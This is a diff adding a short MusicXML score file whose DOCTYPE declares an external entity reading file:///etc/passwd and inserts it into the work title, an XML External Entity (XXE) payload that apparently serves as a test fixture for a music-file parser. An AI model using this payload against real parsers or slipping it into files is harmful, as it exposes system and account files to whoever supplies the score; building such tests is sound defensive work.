@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE score-partwise [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<score-partwise version="4.0">
+  <work><work-title>&xxe;</work-title></work>
+</score-partwise>
